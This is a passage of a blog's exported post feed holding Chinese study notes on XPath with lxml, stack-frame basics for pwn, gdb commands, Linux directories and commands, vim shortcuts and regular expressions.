&lt;price&gt;1.23&lt;/price&gt;</span></span><br><span class="line"><span class="string">    &lt;nick&gt;臭豆腐&lt;/nick&gt;</span></span><br><span class="line"><span class="string">    &lt;author&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;10086&quot;&gt;周大强&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;10010&quot;&gt;周芷若&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick class=&quot;joy&quot;&gt;周杰伦&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick class=&quot;jolin&quot;&gt;蔡依林&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;nick&gt;TTTarget1&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;span&gt;</span></span><br><span class="line"><span class="string">            &lt;nick&gt;TTTarget2&lt;/nick&gt;</span></span><br><span class="line"><span class="string">            &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;nick&gt;TTTarget3&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/span&gt;</span></span><br><span class="line"><span class="string">    &lt;/author&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;partner&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;ppc1&quot;&gt;AAAAim1&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;pbc2&quot;&gt;AAAAim2&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;pbc3&quot;&gt;AAAAim3&lt;/nick&gt;</span></span><br><span class="line"><span class="string">        &lt;nick id=&quot;pbc4&quot;&gt;AAAAim4&lt;/nick&gt;</span></span><br><span class="line"><span class="string">    &lt;/partner&gt;</span></span><br><span class="line"><span class="string">&lt;/book&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">tree = etree.XML(xml)</span><br><span class="line"><span class="comment">#etree.XML用于匹配xml</span></span><br><span class="line"><span class="comment">#etree.HTML用于匹配html</span></span><br><span class="line"><span class="comment">#etree.parse用于匹配本地文件</span></span><br><span class="line"></span><br><span class="line">result1 = tree.xpath(<span class="string">&quot;/book&quot;</span>)  <span class="comment"># /表示层级关系. 第一个/是根节点</span></span><br><span class="line"></span><br><span class="line">result2 = tree.xpath(<span class="string">&quot;/book/name/text()&quot;</span>)  <span class="comment"># text() 拿文本</span></span><br><span class="line"></span><br><span class="line">result3 = tree.xpath(<span class="string">&quot;/book/author//nick/text()&quot;</span>)  <span class="comment"># //所有后代</span></span><br><span class="line"></span><br><span class="line">result4 = tree.xpath(<span class="string">&quot;/book/author/*/nick/text()&quot;</span>)  <span class="comment"># * 任意的节点. 通配符</span></span><br><span class="line"></span><br><span class="line">result5 = tree.xpath(<span class="string">&quot;/book/partner/nick[1]/text()&quot;</span>)  <span class="comment"># 表示在该目录下的第一个元素，匹配到AAAAim1。注意，此语法中无[0]！</span></span><br><span class="line"></span><br><span class="line">result6 = tree.xpath(<span class="string">&quot;/book/partner/nick[@id=&quot;</span>pbc2<span class="string">&quot;]/text()&quot;</span>) <span class="comment"># 使用[]用于按照标签筛选，结果为AAAAim2</span></span><br><span class="line"></span><br><span class="line"> result7 = tree.xpath(<span class="string">&quot;/book/partner/nick/@id&quot;</span>) <span class="comment"># 直接提取nick标签的id属性</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>其中<code>//</code>代表任意的子集（可以是一层或多层），只要存在就能找到；<br>而<code>/*/</code>代表且只能代表任意一层。</p><p>举例说：<br>代码块中，<code>result4</code>可以匹配到<code>TTTarget1</code>、<code>TTTarget2</code>、<code>TTTarget</code>。<br>但<code>result5</code>只能匹配到<code>TTTarget1</code>、<code>TTTarget2</code>,不能匹配到<code>TTTarget3</code>。</p><p>当使用<code>../xxx[n]/../text()</code>语法时，一定要记住这里的<strong>n是从1开始计数</strong>，如代码块中匹配到的就是<code>AAAAim1</code>，并非<code>AAAAim2</code>！</p><p>注意，当筛选两次，即使用如下语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ol_li_list = tree.xpath(<span class="string">&quot;/html/body/ol/li&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> ol_li_list:     <span class="comment"># 从每一个li中提取到文字信息</span></span><br><span class="line">     result = li.xpath(<span class="string">&quot;./a/text()&quot;</span>) <span class="comment">#在li中继续去寻找. 相对查找</span></span><br><span class="line">     <span class="built_in">print</span>(result2)</span><br></pre></td></tr></table></figure><p><strong>在相对查找时，需要使用<code>./</code>而非<code>/</code>以表示相对路径！</strong></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn栈基础</title>
      <link href="/2022/02/14/PWN_%E6%A0%88%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/02/14/PWN_%E6%A0%88%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN-栈基础"><a href="#PWN-栈基础" class="headerlink" title="PWN_栈基础"></a>PWN_栈基础</h1><h2 id="程序段结构图："><a href="#程序段结构图：" class="headerlink" title="程序段结构图："></a>程序段结构图：</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220214115234565.png" alt="image-20220214115234565"></p><h2 id="栈结构图："><a href="#栈结构图：" class="headerlink" title="栈结构图："></a>栈结构图：</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220214120911800.png" alt="image-20220214120911800"></p><p>栈在内存中向下增长（地址下降）。<br>每个函数有自己的栈空间，从栈底（高地址）向栈顶（低地址）增长，函数与函数之间被称为栈帧。</p><p>其中，<br>    <strong>EBP</strong>指向栈底；<strong>ESP</strong>指向栈顶；</p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gdb调试基础</title>
      <link href="/2022/02/14/gdb%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/02/14/gdb%E8%B0%83%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="gdb调试基础"><a href="#gdb调试基础" class="headerlink" title="gdb调试基础"></a>gdb调试基础</h1><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220213222351708.png" alt="image-20220213222351708" style="zoom:150%;" /><p><strong>调试</strong>：<br>    <code>s</code>默认在源代码下进行调试，在已经输入<code>s</code>的情况下，直接回车执行上一条语句；<br>    <code>si</code>为在汇编下进行调试；</p><p><strong>下断点：</strong></p><pre><code> 1. `b func_name` 2. `b /src/codefile.cc:81` gdb将在运行到源码文件/src/codefile.cc的第81行中断 3. `b *0x5859c0` &quot;*&quot;号是必须加在地址前的，0x5859c0为函数指针的地址</code></pre><p><strong>段列表：</strong><br>    <code>vmap</code>可以显示程序的段列表</p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础</title>
      <link href="/2022/01/29/Linux%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/01/29/Linux%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a>Linux基础</h1><h2 id="一、Linux文件系统根目录下的目录及他们的作用"><a href="#一、Linux文件系统根目录下的目录及他们的作用" class="headerlink" title="一、Linux文件系统根目录下的目录及他们的作用"></a>一、Linux文件系统根目录下的目录及他们的作用</h2><p><strong>一切皆文件</strong></p><p>根目录下存多个文件夹（名称系统定义，不能修改）：</p><ul><li><p>/bin[<strong>常用</strong>] （/usr/bin 、/user/local/bin)    </p><p>为Binary缩写，存放着最常使用的命令</p></li><li><p>/sbin （/usr/sbin、/user/local/sbin）</p><p>s即SuperUser，存放管理员的系统管理程序</p></li><li><p>/home[<strong>常用</strong>]</p><p>用于存放不同用户创建的文件，结构为/home/用户名/……</p></li><li><p>/root[<strong>常用</strong>] </p><p>系统管理员，超级权限者的主目录</p></li><li><p>/lib </p><p>系统开机需要最基本的动态链接库,同时存放程序需要的动态链接库</p></li><li><p>/lost+found (隐藏目录)</p><p>存放非法关机后生成的文件</p></li><li><p>/etc [<strong>常用</strong>]</p><p>系统管理需要的配置文件和子目录，例如mysql的my.conf</p></li><li><p>/usr [<strong>常用</strong>]</p><p>非常重要，放置用户的很多应用程序和文件，类似programfiles</p></li><li><p>/boot [<strong>常用</strong>]</p><p>系统启动的核心文件，一些连接文件和镜像文件</p></li><li><p>/proc [<strong>不能动</strong>]</p><p>是一个虚拟的目录，是系统内存的映射，访问这个目录获得系统信息</p></li><li><p>/srv [<strong>不能动</strong>]</p><p>是service的缩写，存放一些服务启动后的数据</p></li><li><p>/sys [<strong>不能动</strong>]</p><p>这是Linux 2.6版本的拜年话，安装了内核新出现的文件系统sysfs</p></li><li><p>/tmp</p><p>存放临时文件</p></li><li><p>/dev </p><p>是device的缩写，把硬件当作文件形式储存，类似设备管理器</p></li><li><p>/media [<strong>常用</strong>]</p><p>系统会识别一些设备，如u盘、光驱，识别后，系统会将被识别的设备挂载在此目录下</p></li><li><p>/mnt [<strong>常用</strong>]</p><p>系统提供该目录让用户挂载其他文件系统，我们可以将外部储存挂载在该目录，然后进入就可以查看其中的内容了</p></li><li><p>/opt </p><p>默认将安装文件放在该目录下（安装前）</p></li><li><p>/user/local [<strong>常用</strong>]</p><p>安装软件的目录（安装后），一般是以源码方式安装的程序</p></li><li><p>/var [<strong>常用</strong>]</p><p>存放不断扩充的内容，常用的就是一些日志等等</p></li><li><p>/selinux [security-enhanced-Linux]</p><p>一种安全子系统，控制程序访问的文件，可以自行开启关闭</p></li></ul><p>linux的隐藏文件是以<code>.</code>开头的</p><h2 id="二、Linux实用指令"><a href="#二、Linux实用指令" class="headerlink" title="二、Linux实用指令"></a>二、Linux实用指令</h2><h3 id="1-帮助指令"><a href="#1-帮助指令" class="headerlink" title="1.帮助指令"></a>1.帮助指令</h3><p><code>man+space+[指令名]</code>：</p><p>输出帮助，一般会显示命令作用及各个参数，在linux中，各个参数可以组合使用，例如，ls指令有参数<code>-l</code>和<code>-a</code>，可以直接简化为<code>-la</code>。</p><p><code>help+[shell命令]</code>：</p><p>输出shell命令的帮助。</p><h3 id="2-文件目录指令"><a href="#2-文件目录指令" class="headerlink" title="2.文件目录指令"></a>2.文件目录指令</h3><p><strong><code>pwd</code>指令：</strong></p><p>作用：pwd指令用于显示当前绝对路径</p><p><strong><code>ls</code>指令：</strong></p><p>作用：<br>    ls指令用于列出目录下的内容<br>基本用法：<br>    <code>ls [选项] [目录或文件]</code><br>常用选项:<br>    <code>-a</code>:显示当前目录下的所有文件（包括隐藏文件）<br>    <code>-l</code>: 以列表的形式显示详细信息<br>    <code>-lh</code>：以列表的形式显示详细信息并且增加可读性（转化单位）</p><p><strong><code>cd</code>指令：</strong></p><p>作用：<br>    cd指令用于切换目录<br>基本语法：<br>    <code>cd [参数]</code><br>特殊用法：<br>    <code>cd ~</code>或者<code>cd :</code> 回到家目录<br>    <code>cd ..</code>回到上一级目录</p><p><strong><code>mkdir</code>指令：</strong></p><p>作用：<br>    mkdir指令用于创建目录<br>基本语法：<br>    <code>mkdir [选项] 要创建的目录</code><br>常用选项：<br>    <code>-p</code>：创建多级目录</p><p><strong><code>rmdir</code>指令：</strong></p><p>作用：<br>    rmdir指令删除空目录<br>基本语法：<br>    <code>rmdir [选项] 要删除的目录</code><br>使用细节：<br>    rmdir删除的目录是空的，如果目录下有内容是无法删除的</p><p>如果要删除非空目录，使用**<code>rm -rf [目录]</code>**来强制删除非空目录。</p><p><strong><code>touch</code>指令：</strong></p><p>创建空文件</p><p><strong><code>cp</code>指令</strong>：</p><p>作用：<br>    cp指令拷贝文件到指定目录<br>基本语法：<br>    <code>cp [选项] source destination</code><br>常用选项：<br>    <code>-r</code> ：递归赋值整个文件夹<br>常见用法：<br>    使用<code>\cp</code>表示默认覆盖原有文件</p><p><strong><code>rm</code>指令</strong>：</p><p>作用：<br>    删除文件或目录<br>基本语法：<br>    <code>rm [选项] 要删除的文件或目录</code><br>常用选项：<br>    <code>-r</code>：递归删除整个文件夹<br>    <code>-f</code>：强制删除不提示</p><p><strong><code>mv</code>指令：</strong></p><p>作用：<br>    移动文件与目录或重命名<br>基本语法：<br>    <code>mv oldNameFile newNameFile</code>（重命名）<br>    <code>mv /temp/movefile /targetFolder</code>(移动)</p><p><strong><code>cat</code>指令：</strong></p><p>作用：<br>    查看文件内容（只读）<br>基本语法：<br>    cat [选项] 要查看的文件<br>常用选项：<br>    <code>-n</code>显示行号</p><p><strong><code>tail</code>指令：</strong></p><p>作用：<br>    tail指令用于输出文件尾部的内容，默认为十行，一般用与监听文件内容变化<br>基本语法：<br>    <code>tail 文件</code>（查看文件尾十行内容）<br>    <code>tail -n 5 文件</code>（查看文件尾五行内容）<br>    <code>tail -f 文件</code>（监听文档的所有更新）</p><p><strong><code>&gt;</code>指令和<code>&gt;&gt;</code>指令：</strong></p><p>作用：<br>    用于进行重定向和追加（即覆盖和添加）<br>基本语法：<br>    1）<code>ls -l &gt;a.txt</code>（将列表的内容写入文件a.txt中)<br>    2）<code>ls -al &gt;&gt;b.txt</code>(将列表内容追加到b.txt文件后)<br>    3）<code>cat 文件1 &gt; 文件2</code>（用文件1的内容覆盖文件2）<br>    4）echo “text”&gt;&gt;文件 （将内容追加到文件中）</p><p><strong><code>ln</code>指令：</strong></p><p>作用：<br>    添加软链接（类似快捷方式）<br>基本语法：<br>    <code>ln -s [原文件或目录] [软链接名] </code>（给源文件创建一个软链接）</p><p><strong><code>history</code>指令：</strong></p><p>查看最近执行的n（默认500）条指令<br><code>！</code>语法：直接使用<code>!5</code>执行最近执行的第5条指令</p><h3 id="3、时间指令"><a href="#3、时间指令" class="headerlink" title="3、时间指令"></a>3、时间指令</h3><p><strong><code>date</code>（时间）<code>cal</code>（日历）</strong></p><h3 id="4、搜索查找指令"><a href="#4、搜索查找指令" class="headerlink" title="4、搜索查找指令"></a>4、搜索查找指令</h3><p><strong><code>find</code>指令：</strong></p><p>作用：<br>    从指定目录向下递归遍历各个子目录，将满足条件的文件或目录显示在终端<br>基本语法：<br>    <code>find [搜索范围] [选项]</code><br>选项说明：<br>    <code>-name</code> 按照指定的文件名查找<br>    <code>-user</code>按照指定用户所拥有的文件<br>    <code>-size</code>按照指定的大小查找文件文件</p><p>举例：<br>    <code>find /home -name hello.txt</code>（在home目录下查找名为hello.txt的文件）<br>    <code>find /opt -user nobody</code> (在opt目录下查找所有者为nobody的文件)<br>    <code>find / -size +200M</code>（查找系统中大于200M的文件）<br>其中，文件大小的表示放大（<code>-</code>小于，<code>+</code>大于，无符号大呢关于，单位有kMG）</p><p><strong><code>locate</code>指令</strong>：（过时，需要自行安装）</p><p>作用：<br>    快速定位文件路径<br>基本语法：<br>    <code>locate [文件名]</code><br>前趋指令：<br>    <code>updatedb</code></p><h2 id="三、Linux权限管理"><a href="#三、Linux权限管理" class="headerlink" title="三、Linux权限管理"></a>三、Linux权限管理</h2><h3 id="1-权限基本介绍"><a href="#1-权限基本介绍" class="headerlink" title="1.权限基本介绍"></a>1.权限基本介绍</h3><p>例：<code>ls  -l</code> 中显示的内容如下：</p><p><code>-rwxrw-r-- 1 root root 1213 Feb 2 09:39 abc</code></p><p>对最前面的十个（0~9位）字符进行说明：</p><p>​    第 0 位确定文件类型(d, - , l , c , b)<br>​        <strong>l</strong> 是链接，相当于 <strong>windows</strong> 的快捷方式<br>​        <strong>d</strong> 是目录，相当于 <strong>windows</strong> 的文件夹<br>​        <strong>c</strong> 是字符设备文件，鼠标，键盘<br>​        <strong>b</strong> 是块设备，比如硬盘</p><p>​    第 1-3 位确定所有者（该文件的所有者）拥有该文件的权限。—User</p><p>​    第 4-6 位确定所属组（同用户组的）拥有该文件的权限，—Group </p><p>​    第 7-9 位确定其他用户拥有该文件的权限 —Other；</p><h3 id="2-rwx权限详解"><a href="#2-rwx权限详解" class="headerlink" title="2. rwx权限详解"></a>2. rwx权限详解</h3><h4 id="1-rwx作用到文件："><a href="#1-rwx作用到文件：" class="headerlink" title="1)rwx作用到文件："></a>1)rwx作用到文件：</h4><p>[ r ]代表可读(read): 可以读取,查看<br>[ w ]代表可写(write): 可以修改,但是不代表可以删除该文件,删除一个文件的前提条件是对该文件所在的目录有写权限，才能删除该文件.<br>[ x ]代表可执行(execute):可以被执行</p><h4 id="2）rwx作用到目录"><a href="#2）rwx作用到目录" class="headerlink" title="2）rwx作用到目录"></a>2）rwx作用到目录</h4><p>[ r ]代表可读(read): 可以读取，ls 查看目录内容<br>[ w ]代表可写(write): 可以修改, 对目录内创建+删除+重命名目录<br>[ x ]代表可执行(execute):可以进入该目录，使用cd指令</p><h4 id="3）rwx的数字表示"><a href="#3）rwx的数字表示" class="headerlink" title="3）rwx的数字表示"></a>3）rwx的数字表示</h4><p>可用数字表示为: r=4,w=2,x=1 因此 rwx=4+2+1=7 , 数字可以进行组合；</p><p>因此，一位数字就可以对应一类用户的权限。</p><h3 id="3-修改权限"><a href="#3-修改权限" class="headerlink" title="3.修改权限"></a>3.修改权限</h3><p>通过<code>chmod</code>指令，可以修改文件或者目录的权限，有以下两种方法：</p><h4 id="1）-、-、-变更权限"><a href="#1）-、-、-变更权限" class="headerlink" title="1）+ 、-、= 变更权限"></a>1）+ 、-、= 变更权限</h4><p><code>u</code>:所有者   <code>g</code>:所有组   <code>o</code>:其他人   <code>a</code>:所有人(u、g、o 的总和)</p><ol><li><code>chmod   u=rwx,g=rx,o=x   文件/目录名</code></li><li><code>chmod   o+w    文件/目录名</code></li><li><code>chmod   a-x    文件/目录名</code></li></ol><p>举例说明:</p><ol><li>给 abc 文件 的所有者读写执行的权限，给所在组读执行权限，给其它组读执行权限。</li></ol><p>​        <code>chmod u=rwx,g=rx,o=rx abc</code></p><ol start="2"><li>给 abc 文件的所有者除去执行的权限，增加组写的权限</li></ol><p>​        <code>chmod u-x,g+w abc</code></p><ol start="3"><li>给 abc 文件的所有用户添加读的权限</li></ol><p>​        <code>chmod a+r abc</code></p><h4 id="2-通过数字变更权限"><a href="#2-通过数字变更权限" class="headerlink" title="2)通过数字变更权限"></a>2)通过数字变更权限</h4><p>按照<code>chmod nnn  文件/目录名</code>的方式转化即可：</p><p>​    <strong>其中n对应rwx的数字表示</strong>；</p><p>​    <strong>三位n分别对应<code>u</code>:所有者   <code>g</code>:所有组   <code>o</code>:其他人</strong></p><p>举例说明：</p><p>​    由于r=4 w=2 x=1  rwx=4+2+1=7 </p><p>​    因此<code>chmod u=rwx,g=rx,o=x  a.txt</code></p><p>​    相当于<code>chmod 751  a.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vi和vim的基础使用</title>
      <link href="/2022/01/29/vi%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/01/29/vi%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="vi的基础使用"><a href="#vi的基础使用" class="headerlink" title="vi的基础使用"></a>vi的基础使用</h1><p>vim即vi的增强版，带有代码补全高亮等功能。</p><h2 id="一、vi和vim的三种模式"><a href="#一、vi和vim的三种模式" class="headerlink" title="一、vi和vim的三种模式"></a>一、vi和vim的三种模式</h2><ul><li>正常模式：移动光标，删除字符或者整行，复制粘贴</li><li>插入模式（一般输入i进入）：编辑模式</li><li>命令行模式：（输入esc，然后：）提供相关指令，存档、离开等等</li></ul><p><strong>三种模式的相互转化：</strong></p><p>命令行中输入：<code>vim xxx</code>进入 <em>一般模式</em>；</p><p>在 <em>一般模式</em>中，输入<code>i或者a</code>进入 <em>编辑模式</em>；输入<code>：或者/</code>进入 <em>命令模式</em></p><p>在 <em>命令模式</em>或者 <em>一般模式</em>中，输入<code>esc</code>进入 <em>一般模式</em></p><p><strong>命令行模式的退出方式：</strong></p><p><code>：wq</code>-保存并退出</p><p><code>：q</code>-退出，不保存</p><p><code>：q！</code>-强制退出，不保存</p><h2 id="二、vi快捷键总结"><a href="#二、vi快捷键总结" class="headerlink" title="二、vi快捷键总结"></a>二、vi快捷键总结</h2><h3 id="1-一般模式下的处理"><a href="#1-一般模式下的处理" class="headerlink" title="1.一般模式下的处理"></a>1.一般模式下的处理</h3><p><strong>拷贝</strong>：拷贝当前行为<code>yy</code>；拷贝从当前行开始，直到向下的n行<code>nyy</code>（如<code>5yy</code>)</p><p><strong>粘贴</strong>：输入p</p><p><strong>删除</strong>：删除当前行为<code>dd</code>；删除从当前行开始，直到向下的n行<code>ndd</code>（如<code>5dd</code>)</p><p><strong>撤销</strong>：输入<code>u</code>撤销</p><p><strong>定位到首、末行</strong>：输入<code>G（即shift+g）</code>移动到最末行，输入<code>gg</code>移动到首行</p><p><strong>定位到某一行</strong>：输入要定位的行号（如 <code>20</code>），然后输入<code>G（即shift+g）</code></p><h3 id="2-命令行模式的处理"><a href="#2-命令行模式的处理" class="headerlink" title="2.命令行模式的处理"></a>2.命令行模式的处理</h3><p><strong>查找</strong>：输<code>/</code>进入命令行模式，输入要查找的字符串，回车即可，下一个为<code>n</code></p><p><strong>设置行号</strong>：输<code>：</code>进入命令行模式，输入<code>set nu</code>打开行号，输入<code>set nonu</code>关闭行号</p><h2 id="三、快捷键汇总"><a href="#三、快捷键汇总" class="headerlink" title="三、快捷键汇总"></a>三、快捷键汇总</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220129112602834.png" alt="image-20220129112602834"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220129112635532.png" alt="image-20220129112635532"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220129112720141.png" alt="image-20220129112720141"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220129112740533.png" alt="image-20220129112740533"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220129112802395.png" alt="image-20220129112802395"></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式简单笔记</title>
      <link href="/2022/01/23/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2022/01/23/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>python中可以通过<code>import re</code>引入re模块，用正则表达式处理字符串</p><h2 id="一、正则表达式"><a href="#一、正则表达式" class="headerlink" title="一、正则表达式"></a>一、正则表达式</h2><p><strong>在线正则表达式测试工具：<a href="https://regex101.com/">https://regex101.com/</a></strong></p><h3 id="1、限定符"><a href="#1、限定符" class="headerlink" title="1、限定符"></a>1、限定符</h3><h4 id="匹配单字符"><a href="#匹配单字符" class="headerlink" title="匹配单字符"></a>匹配单字符</h4><p><strong>? 限定符</strong>：通过<code>used？</code>可匹配<code>use</code>或<code>used</code>,等含有<code>use</code>字样，<code>d</code>可有可无；</p><p>*<strong>限定符</strong>：通过<code>ab*c</code>可以匹配 <code>ac abc abbbbc</code>等含有n个b，ac必须按照顺序有的字符串；</p><p><strong>+限定符</strong>：即*限定符除去没有b的情况，<code>ab</code>不会被匹配；</p><p><strong>{n}限定符</strong>：<code>ab&#123;6&#125;c</code>可匹配b出现次数为6的情况，或者，{2,6}为2-6次，{2,}为两次以上</p><h4 id="匹配多字符"><a href="#匹配多字符" class="headerlink" title="匹配多字符"></a>匹配多字符</h4><p>使用 **()**框选所要匹配的字符，然后正常使用限定符。</p><h3 id="2、“或”运算符"><a href="#2、“或”运算符" class="headerlink" title="2、“或”运算符"></a>2、“或”运算符</h3><p>正则表达式要匹配 <code>acat</code>或者 <code>adog</code>时，可以使用或运算符，表达式如下：</p><p><code>a(cat|dog)</code></p><h3 id="3、字符类"><a href="#3、字符类" class="headerlink" title="3、字符类"></a>3、字符类</h3><p><strong>[] 匹配符</strong>：</p><p>如果想匹配ab三个字母组成的内容，可以使用 <code>[abc]+</code>;</p><p>其中<code>[]</code>用于限制匹配的字符；</p><p>在方括号中，我们可以指定范围，语法如 <code>[a-zA-Z]</code>即大小写所有英文字符；</p><p><strong>^匹配：</strong></p><p>和方括号联用，<code>[^0-9]+</code>代表非数字</p><h3 id="4、元字符"><a href="#4、元字符" class="headerlink" title="4、元字符"></a>4、元字符</h3><p>元字符是正则表达式预先定义好的内容</p><table><thead><tr><th>符号</th><th>释义</th><th>解释</th></tr></thead><tbody><tr><td>\d+</td><td>数字字符</td><td>等同于[0-9]</td></tr><tr><td>\w+</td><td>单词字符</td><td>英文、数字、下划线</td></tr><tr><td>\s+</td><td>空白符</td><td>TAB和换行符（空格）</td></tr><tr><td>\D+</td><td>非数字字符</td><td></td></tr><tr><td>\W+</td><td>非单词字符</td><td></td></tr><tr><td>\S+</td><td>非空白字符</td><td></td></tr><tr><td>\b</td><td>单词边界</td><td>\b的前一个字符和后一个字符不全是\w</td></tr><tr><td>.*</td><td>任意字符</td><td>不包含换行符</td></tr></tbody></table><p>注：</p><p>**+**为匹配多个连接的字符，而非一个一个单独匹配</p><table><thead><tr><th>特殊字符</th><th>释义</th><th>解释</th></tr></thead><tbody><tr><td>^</td><td>匹配行首</td><td>如^a,只会匹配行首的a，而非所有a</td></tr><tr><td>$</td><td>匹配行尾</td><td>如$a,只会匹配行尾的a，而非所有a</td></tr></tbody></table><h3 id="5、贪婪与懒惰匹配"><a href="#5、贪婪与懒惰匹配" class="headerlink" title="5、贪婪与懒惰匹配"></a>5、贪婪与懒惰匹配</h3><p>正则表达式默认使用的是贪婪匹配；</p><p>即，当出现较大的字符能被一次匹配时，忽略其包含的较小的字符，优先匹配较大的字符，试举一例，当我们尝试匹配html标签，匹配内容如下：<br><code>&lt;span&gt;&lt;b&gt;this is a text&lt;/b&gt;&lt;/span&gt;</code></p><p>我们可能会使用 <code>&lt;.+&gt;</code>进行匹配：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220123111221372.png" alt="image-20220123111221372"></p><p>正则默认选择了最贪婪的匹配方法。</p><p>我们可以手动切换贪婪匹配为懒惰匹配，使用 <code>&lt;.+?&gt;</code>进行匹配：<br><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220123111350484.png" alt="image-20220123111350484"></p><h3 id="6、优秀教程"><a href="#6、优秀教程" class="headerlink" title="6、优秀教程"></a>6、优秀教程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[详细文本教程]: https://deerchao.cn/tutorials/regex/regex.htm&quot;正则表达式30分钟入门教程&quot;</span><br><span class="line">[10分钟入门]: https://www.bilibili.com/video/BV1da4y1p7iZ?from=search&amp;amp;seid=5661918744314357020&amp;amp;spm_id_from=333.337.0.0&quot;10分钟快速掌握正则表达式&quot;</span><br></pre></td></tr></table></figure><h2 id="二、正则表达式的使用"><a href="#二、正则表达式的使用" class="headerlink" title="二、正则表达式的使用"></a>二、正则表达式的使用</h2><h4 id="1、"><a href="#1、" class="headerlink" title="1、. ^ $"></a>1、. ^ $</h4><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>a.</td><td>abacad</td><td>abacad</td><td>匹配所有”a.”的字符</td></tr><tr><td>^a.</td><td>abacad</td><td>ab</td><td>只从开头匹配”a.”</td></tr><tr><td>a.$</td><td>abacad</td><td>ad</td><td>只匹配结尾的”a.$”</td></tr></tbody></table><h4 id="2、"><a href="#2、" class="headerlink" title="2、* + ? { }"></a>2、* + ? { }</h4><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>a.?</td><td>abefacgad</td><td>ab ac ad</td><td>?表示重复零次或一次，即只匹配”a”后面一个任意字符。</td></tr><tr><td>a.*</td><td>abefacgad</td><td>abefacgad</td><td>*表示重复零次或多次，即匹配”a”后面0或多个任意字符。</td></tr><tr><td>a.+</td><td>abefacgad</td><td>abefacgad</td><td>+表示重复一次或多次，即只匹配”a”后面1个或多个任意字符。</td></tr><tr><td>a.{1,2}</td><td>abefacgad</td><td>abe acg ad</td><td>{1,2}匹配1到2次任意字符。</td></tr></tbody></table><p>注意：前面的*,+,?等都是贪婪匹配，也就是尽可能匹配，后面加?号使其变成惰性匹配</p><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>a.*?</td><td>abefacgad</td><td>a a a</td><td>惰性匹配</td></tr></tbody></table><h4 id="3、字符集［］［-］"><a href="#3、字符集［］［-］" class="headerlink" title="3、字符集［］［^］"></a>3、字符集［］［^］</h4><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>a[befcgd]*</td><td>abefacgad</td><td>abef acg ad</td><td>表示匹配”a”后面[befcgd]的字符任意次`</td></tr><tr><td>a[^f]*</td><td>abefacgad</td><td>abe 